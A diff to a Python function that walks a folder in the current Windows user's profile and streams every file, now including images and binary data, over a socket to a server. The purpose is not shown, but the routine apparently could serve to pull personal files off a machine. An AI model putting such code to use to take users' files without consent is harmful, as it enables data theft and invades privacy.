@@ -78,7 +78,7 @@ def sendFiles(filedir: str):
             msg = suck.recv(1024).decode("utf-8")
             if msg == "FILE_count_recv": break
 
-        bannedtypes = [".lnk", ".rdp", ".ini",".jpg",".png",".webp",".gif",".mp4",".docx", ".crdownload"]
+        bannedtypes = [".lnk", ".rdp", ".ini",".webp",".gif",".mp4",".docx", ".crdownload"]
         for filename in listdir(full_path): # Get each file in folder
             if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
                 data = f"{filename}"
@@ -87,16 +87,17 @@ def sendFiles(filedir: str):
                 print(f"SERVER: {msg}")
 
                 filepath = full_path + "\\"+filename
-                with open(filepath, "r") as f:
+                print(f"Sent {filepath}")
+                with open(filepath, "rb") as f:
                     while True:
                         data = f.read(1024)
             
                         if not data:
-                            suck.send("END".encode("utf-8"))
+                            suck.send(b"**?END?**")
                             print("END")
                             break
             
-                        suck.send(data.encode("utf-8"))
+                        suck.send(data)
                         msg = suck.recv(1024).decode("utf-8")
                 print("Ended")
             
